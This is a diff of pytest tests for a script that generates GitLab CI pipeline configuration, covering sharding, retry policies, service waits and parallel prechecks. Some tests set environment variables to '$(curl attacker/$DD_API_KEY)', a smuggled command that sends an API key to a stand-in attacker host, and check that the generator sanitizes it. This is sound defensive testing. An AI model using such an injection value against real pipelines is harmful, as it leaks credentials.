@@ -2,12 +2,16 @@
 
 import importlib.util
 import io
+import json
 import pathlib
+import shlex
+import subprocess
 import sys
 import types
 from unittest import mock
 
 import pytest
+import yaml
 
 
 _SCRIPT_PATH = pathlib.Path(__file__).resolve().parents[2] / "scripts" / "gen_gitlab_config.py"
@@ -15,17 +19,10 @@ _SCRIPT_PATH = pathlib.Path(__file__).resolve().parents[2] / "scripts" / "gen_gi
 
 @pytest.fixture(scope="module")
 def gen_gitlab_config_mod():
-    # The script is not importable as-is: it runs under uv with its own dependencies, parses argv at
-    # import time, and appends to sys.path. Stub ruamel.yaml, give it an empty argv, and restore
-    # sys.path afterwards so the rest of the suite is unaffected.
+    # The script parses argv and imports the generator-only ruamel dependency at import time.
     ruamel = types.ModuleType("ruamel")
     yaml = types.ModuleType("ruamel.yaml")
-
-    class YAML:
-        def load(self, content):
-            return {"variables": {"TESTRUNNER_IMAGE": "testrunner:fake"}}
-
-    yaml.YAML = YAML
+    yaml.YAML = object
     ruamel.yaml = yaml
 
     spec = importlib.util.spec_from_file_location("gen_gitlab_config", _SCRIPT_PATH)
@@ -65,100 +62,134 @@ def test_get_bool_env_only_allows_literal_true(gen_gitlab_config_mod, monkeypatc
 def test_jobspec_sanitizes_nightly_build_before_script(gen_gitlab_config_mod, monkeypatch):
     monkeypatch.setenv("NIGHTLY_BUILD", "$(curl attacker/$DD_API_KEY)")
 
-    with mock.patch.object(gen_gitlab_config_mod.subprocess, "check_output", return_value=b"pip-key\n"):
-        config = str(gen_gitlab_config_mod.JobSpec(name="suite", stage="core"))
+    config = str(gen_gitlab_config_mod.JobSpec(name="suite", stage="core"))
 
     assert '    - export NIGHTLY_BUILD="false"' in config
     assert "$(curl" not in config
     assert "$DD_API_KEY" not in config
 
 
+@pytest.mark.parametrize(
+    "config, message",
+    [
+        ({"parallelism": 2}, "must use venvs_per_job"),
+        ({"ddtest": True, "venvs_per_job": 2}, "shard with ddtest_nodes"),
+    ],
+)
+def test_gen_tests_rejects_unsupported_sharding_controls(gen_gitlab_config_mod, config, message):
+    with pytest.raises(ValueError, match=message):
+        gen_gitlab_config_mod._gen_tests({"suite": {"type": "test", **config}}, ["suite"])
+
+
+def test_parallelism_defaults_to_one_job(gen_gitlab_config_mod):
+    assert gen_gitlab_config_mod.calculate_parallelism_from_venvs(12) == 1
+
+
 def test_ddtest_requires_a_test_path_for_every_venv(gen_gitlab_config_mod):
     info = gen_gitlab_config_mod.SuiteVenvInfo(
-        venv_count=2,
-        python_versions={"3.12"},
-        riot_venvs=(("hash-with-path", "3.12"), ("hash-without-path", "3.12")),
-        venv_test_locations={"hash-with-path": "tests/internal", "hash-without-path": ""},
+        environment_hashes=("hash-with-path", "hash-without-path"),
+        environments=(("hash-with-path", "3.12"), ("hash-without-path", "3.12")),
+        ddtest_metadata={
+            "hash-with-path": ("first.txt", "tests/internal", "pytest tests/internal", ""),
+            "hash-without-path": ("second.txt", "", "pytest tests/internal", ""),
+        },
     )
 
     with pytest.raises(ValueError, match="hash-without-path"):
         gen_gitlab_config_mod._ddtest_module().validate_ddtest_venv_test_locations(
-            "internal", info.riot_venvs, info.venv_test_locations
+            "internal",
+            info.environments,
+            {environment_hash: metadata[1] for environment_hash, metadata in info.ddtest_metadata.items()},
         )
 
 
-def test_ddtest_jobs_emit_suite_environment(gen_gitlab_config_mod):
-    output = io.StringIO()
-    ddtest_jobs = gen_gitlab_config_mod._ddtest_module()
-
-    with mock.patch.object(ddtest_jobs.subprocess, "check_output", return_value=b"pip-key\n"):
-        ddtest_jobs.emit_ddtest_jobs(
-            output,
-            suite="internal",
-            stage="core",
-            clean_name="internal",
-            config={"env": {"_DD_PYTEST_XDIST_INFERRED_SERVICE": "tests.internal"}},
-            environments=[("abc1234", "3.13"), ("def5678", "3.14")],
-            k=1,
-            testrunner_image_hash="image-hash",
-            runner="riot",
-        )
-
-    content = output.getvalue()
-    assert "_DD_PYTEST_XDIST_INFERRED_SERVICE: tests.internal" in content
-    assert "PIP_CACHE_DIR: ${CI_PROJECT_DIR}/.cache/pip" in content
-    assert "PIP_CACHE_KEY: pip-key" in content
-    assert "key: v1-pip-${PIP_CACHE_KEY}-image-hash-cache" in content
-    assert "TEST_ENVIRONMENT_HASH_PYTHON: abc1234:3.13 def5678:3.14" in content
-    run_313_needs = content.split("core/internal::ddtest-run-3.13:", 1)[1].split("\n  parallel:\n", 1)[0]
-    run_314_needs = content.split("core/internal::ddtest-run-3.14:", 1)[1].split("\n  parallel:\n", 1)[0]
-    assert 'PYTHON_VERSION: "3.13"' in run_313_needs
-    assert 'PYTHON_VERSION: "3.14"' in run_314_needs
-    assert 'PYTHON_VERSION: "3.14"' not in run_313_needs
-    assert 'PYTHON_VERSION: "3.13"' not in run_314_needs
-
-
-def test_ddtest_uv_jobs_preserve_the_suite_command(gen_gitlab_config_mod):
+@pytest.mark.parametrize("retry_policy", [None, ".retry_on_infrastructure_or_service_failure"])
+def test_ddtest_jobs_preserve_the_suite_command(gen_gitlab_config_mod, retry_policy):
     output = io.StringIO()
     ddtest_jobs = gen_gitlab_config_mod._ddtest_module()
     metadata = {
-        "uv123": (
-            ".riot/requirements/uv123.txt",
+        "env123": (
+            "tests/requirements_locks/env123.txt",
             "tests/tracer/**/test*.py",
             "pytest -v --ignore=tests/tracer/test_uwsgi_shutdown.py tests/tracer/",
             "PYTHONOPTIMIZE=1",
         )
     }
 
-    with mock.patch.object(ddtest_jobs.subprocess, "check_output", return_value=b"pip-key\n"):
-        ddtest_jobs.emit_ddtest_jobs(
-            output,
-            suite="tracer",
-            stage="core",
-            clean_name="tracer",
-            config={"env": {}},
-            environments=[("uv123", "3.12")],
-            k=1,
-            testrunner_image_hash="image-hash",
-            runner="uv",
-            uv_metadata=metadata,
-        )
+    ddtest_jobs.emit_ddtest_jobs(
+        output,
+        suite="tracer",
+        stage="core",
+        clean_name="tracer",
+        config={"env": {}, "retry_policy": retry_policy},
+        environments=[("env123", "3.12")],
+        k=1,
+        metadata=metadata,
+        wait_lockfile="tests/requirements_locks/wait.txt",
+    )
 
     content = output.getvalue()
-    assert "extends: .ddtest_plan_uv" in content
-    assert "extends: .ddtest_run_uv" in content
-    assert "DDTEST_UV_COMMAND_uv123: pytest -v --ignore=tests/tracer/test_uwsgi_shutdown.py tests/tracer/" in content
-    assert "DDTEST_UV_ENV_uv123: PYTHONOPTIMIZE=1" in content
+    for base in (".ddtest_plan", ".ddtest_run"):
+        extends = f"[{base}, {retry_policy}]" if retry_policy else base
+        assert f"extends: {extends}" in content
+    assert "DDTEST_COMMAND_env123: pytest -v --ignore=tests/tracer/test_uwsgi_shutdown.py tests/tracer/" in content
+    assert "DDTEST_ENV_env123: PYTHONOPTIMIZE=1" in content
 
 
-def test_ddtest_uv_jobs_preserve_environment_values_with_spaces(gen_gitlab_config_mod):
+@pytest.mark.parametrize("main", [False, True])
+def test_azure_suites_retry_infrastructure_or_service_failures(gen_gitlab_config_mod, main):
+    root = _SCRIPT_PATH.parents[1]
+    policies = yaml.safe_load((root / ".gitlab/retry-policies.yml").read_text())
+    if main:
+        policies.update(yaml.safe_load((root / ".gitlab/retry-policies-main.yml").read_text()))
+    assert "exit_codes" not in policies[".retry_on_infrastructure_failure"]["retry"]
+
+    suites = yaml.safe_load((root / "tests/contrib/suitespec.yml").read_text())["suites"]
+    azure_suites = {name: config for name, config in suites.items() if name.startswith("azure_")}
+    assert len(azure_suites) == 8
+    for name, suite in azure_suites.items():
+        suite.pop("matrix")
+        with mock.patch.object(gen_gitlab_config_mod, "_wait_lockfile", return_value="wait.txt"):
+            config = str(gen_gitlab_config_mod.JobSpec(name=name, stage="contrib", **suite))
+        assert "  extends: [.test_base_snapshot, .retry_on_infrastructure_or_service_failure]" in config
+        assert "  retry:" not in config
+        policy = policies[suite["retry_policy"]]
+        assert policy["extends"] == ".retry_on_infrastructure_failure"
+        assert policy["variables"]["FF_USE_NEW_BASH_EVAL_STRATEGY"] == "true"
+        retry = {**policies[policy["extends"]]["retry"], **policy["retry"]}
+        assert retry == {
+            **policies[".retry_on_infrastructure_failure"]["retry"],
+            "max": 2,
+            "exit_codes": [75],
+        }
+        assert "script_failure" not in retry["when"]
+
+
+@pytest.mark.parametrize("use_policy, expected_status", [(False, 1), (True, 75)])
+def test_service_retry_policy_preserves_bash_exit_status(use_policy, expected_status):
+    root = _SCRIPT_PATH.parents[1]
+    policies = yaml.safe_load((root / ".gitlab/retry-policies.yml").read_text())
+    variables = policies[".retry_on_infrastructure_or_service_failure"].get("variables", {}) if use_policy else {}
+    command = shlex.join([sys.executable, "-c", "raise SystemExit(75)"])
+    evaluation = f"eval {shlex.quote(command)}"
+    # GitLab Runner's new strategy evaluates the command in an explicit subshell.
+    if variables.get("FF_USE_NEW_BASH_EVAL_STRATEGY") == "true":
+        evaluation = f"({evaluation})"
+    script = f"set -eo pipefail\n: | {evaluation}\nexit 0\n"
+
+    result = subprocess.run(["bash", "-c", script], capture_output=True, text=True)
+
+    assert result.returncode == expected_status, result.stderr
+
+
+def test_ddtest_jobs_preserve_environment_values_with_spaces(gen_gitlab_config_mod):
     payload = gen_gitlab_config_mod._shell_environment(
         {
             "DDTEST_PYTEST_ADDOPTS": "-vv --ignore-glob='*civisibility*'",
             "DDTEST_SUITE_PATH": "tests/integration",
         }
     )
-    result = gen_gitlab_config_mod.subprocess.run(
+    result = subprocess.run(
         [
             "bash",
             "-c",
@@ -174,37 +205,20 @@ def test_ddtest_uv_jobs_preserve_environment_values_with_spaces(gen_gitlab_confi
     assert (gen_gitlab_config_mod.GITLAB / "tests.yml").read_text().count('eval "export ${!env_var}"') == 2
 
 
-def test_build_base_venvs_template_gets_sanitized_bool_values(gen_gitlab_config_mod, monkeypatch, tmp_path):
-    monkeypatch.setenv("NIGHTLY_BUILD", "$(curl attacker/$DD_API_KEY)")
-    monkeypatch.setenv("UNPIN_DEPENDENCIES", "$(curl attacker/$DD_API_KEY)")
-    monkeypatch.setattr(gen_gitlab_config_mod, "TESTS_GEN", tmp_path / "tests-gen.yml")
-    monkeypatch.setattr(gen_gitlab_config_mod, "_global_python_versions", {"3.11"})
-
-    gen_gitlab_config_mod.gen_build_base_venvs()
-
-    config = (tmp_path / "tests-gen.yml").read_text()
-    assert 'echo "NIGHTLY_BUILD: false"' in config
-    assert 'echo "UNPIN_DEPENDENCIES: false"' in config
-    assert 'if [[ "false" == "true" ]]' in config
-    assert "$(curl" not in config
-    assert "$DD_API_KEY" not in config
-
-
-def test_migrated_jobs_use_uv_environments(gen_gitlab_config_mod):
+def test_jobs_use_declared_environments(gen_gitlab_config_mod):
     environment_hashes = ("first", "second", "third")
     config = str(
         gen_gitlab_config_mod.JobSpec(
             name="tracer",
             stage="core",
             suite="tracer",
-            uses_uv=True,
             parallelism=2,
-            python_versions={"3.10", "3.11"},
             environment_hashes=environment_hashes,
         )
     )
 
-    assert "  extends: .test_base_uv" in config
+    assert "  extends: .test_base" in config
+    assert "    - job: extract_test_artifacts" in config
     assert "    TEST_SUITE: tracer" in config
     configured_hashes = {
         environment_hash
@@ -215,31 +229,140 @@ def test_migrated_jobs_use_uv_environments(gen_gitlab_config_mod):
     assert configured_hashes == set(environment_hashes)
 
 
-def test_migrated_snapshot_job_uses_defined_base(gen_gitlab_config_mod):
-    config = str(
-        gen_gitlab_config_mod.JobSpec(
-            name="requests", stage="contrib", suite="contrib::requests", uses_uv=True, snapshot=True
-        )
-    )
-    extends = next(line.removeprefix("  extends: ") for line in config.splitlines() if line.startswith("  extends: "))
-    test_templates = (gen_gitlab_config_mod.GITLAB / "tests.yml").read_text()
-
-    assert extends == ".test_base_uv_snapshot"
-    assert f"{extends}:" in test_templates
-
-
-def test_migrated_jobs_allow_prerelease_dependencies_when_unpinned(gen_gitlab_config_mod, monkeypatch):
+def test_unpinned_jobs_allow_prerelease_dependencies(gen_gitlab_config_mod, monkeypatch):
     monkeypatch.setenv("UNPIN_DEPENDENCIES", "true")
 
-    config = str(gen_gitlab_config_mod.JobSpec(name="tracer", stage="core", suite="tracer", uses_uv=True))
+    config = str(gen_gitlab_config_mod.JobSpec(name="tracer", stage="core", suite="tracer"))
 
     assert "    UV_PRERELEASE: allow" in config
 
 
-def test_unmigrated_jobs_keep_using_riot(gen_gitlab_config_mod):
-    with mock.patch.object(gen_gitlab_config_mod.subprocess, "check_output", return_value=b"pip-key\n"):
-        config = str(gen_gitlab_config_mod.JobSpec(name="requests", stage="contrib", suite="requests"))
+def test_snapshot_job_uses_defined_base(gen_gitlab_config_mod):
+    with mock.patch.object(gen_gitlab_config_mod, "_wait_lockfile", return_value="tests/requirements_locks/wait.txt"):
+        config = str(
+            gen_gitlab_config_mod.JobSpec(name="requests", stage="contrib", suite="contrib::requests", snapshot=True)
+        )
+    extends = next(line.removeprefix("  extends: ") for line in config.splitlines() if line.startswith("  extends: "))
+    test_templates = (gen_gitlab_config_mod.GITLAB / "tests.yml").read_text()
 
-    assert "  extends: .test_base_riot" in config
-    assert "    PIP_CACHE_KEY: pip-key" in config
-    assert "TEST_ENVIRONMENTS_" not in config
+    assert extends == ".test_base_snapshot"
+    assert f"{extends}:" in test_templates
+
+
+def _wait_command(gen_gitlab_config_mod, services, snapshot=True):
+    with mock.patch.object(gen_gitlab_config_mod, "_wait_lockfile", return_value="tests/requirements_locks/wait.txt"):
+        config = str(
+            gen_gitlab_config_mod.JobSpec(
+                name="example", stage="contrib", suite="contrib::example", snapshot=snapshot, services=services
+            )
+        )
+    return next(line for line in config.splitlines() if "tests/wait-for-services.py" in line)
+
+
+@pytest.mark.parametrize("services", [[], ["elasticsearch", "httpbin"], ["memcached", "kafka"]])
+def test_http_only_services_wait_without_a_client_environment(gen_gitlab_config_mod, services):
+    command = _wait_command(gen_gitlab_config_mod, services)
+
+    assert "uv run" not in command
+    assert command.endswith(f"python tests/wait-for-services.py {' '.join([*services, 'testagent'])}")
+    assert 'DD_TRACE_AGENT_URL="http://testagent:9126" AGENT_VERSION="testagent" ' in command
+
+
+@pytest.mark.parametrize("services", [["postgres"], ["memcached", "redis"], ["azurite", "azureeventhubsemulator"]])
+def test_client_library_services_wait_in_the_client_environment(gen_gitlab_config_mod, services):
+    command = _wait_command(gen_gitlab_config_mod, services, snapshot=False)
+
+    assert (
+        "uv run --no-project --python 3.9 --no-python-downloads "
+        "--with-requirements tests/requirements_locks/wait.txt --no-progress "
+        f"python tests/wait-for-services.py {' '.join(services)}"
+    ) in command
+
+
+def test_prechecks_job_runs_checks_in_parallel(gen_gitlab_config_mod, monkeypatch, tmp_path):
+    """The prechecks job must feed every selected check to the parallel runner."""
+    # Stub needs_testrun: its real module needs uv-script dependencies (lxml,
+    # vcrpy, ...) that are not installed in the test environment.
+    fake_needs_testrun = types.ModuleType("needs_testrun")
+    fake_needs_testrun.pr_matches_patterns = lambda patterns: True
+    monkeypatch.setitem(sys.modules, "needs_testrun", fake_needs_testrun)
+
+    tests_gen = tmp_path / "tests-gen.yml"
+    monkeypatch.setattr(gen_gitlab_config_mod, "TESTS_GEN", tests_gen)
+
+    gen_gitlab_config_mod.gen_pre_checks()
+
+    out = tests_gen.read_text()
+    assert "scripts/lint prepare" in out
+    assert "scripts/run-parallel-prechecks.py - <<'EOF'" in out
+    for name, command in (
+        ("Style", "scripts/lint style"),
+        ("Typing", "scripts/lint typing"),
+        ("Spelling", "scripts/lint spelling"),
+        ("Security", "scripts/lint security"),
+    ):
+        expected = json.dumps({"name": name, "command": command})
+        assert f"      {expected}\n" in out
+    # Checks must not be emitted as sequential script steps anymore.
+    assert "section_0" not in out
+
+
+def test_run_parallel_prechecks_reports_each_result(tmp_path):
+    script = _SCRIPT_PATH.parents[1] / "scripts" / "run-parallel-prechecks.py"
+    checks = tmp_path / "checks.jsonl"
+    checks.write_text(
+        json.dumps({"name": "Passing", "command": "echo ok"})
+        + "\n"
+        + json.dumps({"name": "Failing", "command": "echo oops >&2; exit 3"})
+        + "\n"
+    )
+
+    proc = subprocess.run([sys.executable, str(script), str(checks)], capture_output=True, text=True, timeout=60)
+
+    assert proc.returncode == 1
+    assert "Passing: PASS" in proc.stdout
+    assert "Failing: FAIL" in proc.stdout
+    assert "oops" in proc.stdout
+    assert proc.stdout.index("Passing: PASS") < proc.stdout.index("Failing: FAIL")
+    # Both checks must appear in the summary table.
+    assert "  FAIL" in proc.stdout
+
+
+@pytest.mark.parametrize(
+    "line",
+    [
+        "not json",
+        '"just a string"',
+        '{"name": "Missing command"}',
+        '{"name": "", "command": "true"}',
+        '{"name": "Extra key", "command": "true", "timeout": 60}',
+    ],
+)
+def test_run_parallel_prechecks_rejects_malformed_lines(tmp_path, line):
+    script = _SCRIPT_PATH.parents[1] / "scripts" / "run-parallel-prechecks.py"
+    checks = tmp_path / "checks.jsonl"
+    checks.write_text(line + "\n")
+
+    proc = subprocess.run([sys.executable, str(script), str(checks)], capture_output=True, text=True, timeout=60)
+
+    assert proc.returncode == 2
+    assert "malformed check line" in proc.stderr
+
+
+def test_run_parallel_prechecks_runs_checks_concurrently(tmp_path):
+    """Two checks that wait for each other's sentinel file can only pass in parallel."""
+    script = _SCRIPT_PATH.parents[1] / "scripts" / "run-parallel-prechecks.py"
+    wait_for = 'touch "{d}/{name}"; for _ in $(seq 50); do [ -e "{d}/{other}" ] && exit 0; sleep 0.1; done; exit 1'
+    checks = tmp_path / "checks.jsonl"
+    checks.write_text(
+        json.dumps({"name": "First", "command": wait_for.format(d=tmp_path, name="a", other="b")})
+        + "\n"
+        + json.dumps({"name": "Second", "command": wait_for.format(d=tmp_path, name="b", other="a")})
+        + "\n"
+    )
+
+    proc = subprocess.run([sys.executable, str(script), str(checks)], capture_output=True, text=True, timeout=60)
+
+    assert proc.returncode == 0
+    assert "First: PASS" in proc.stdout
+    assert "Second: PASS" in proc.stdout
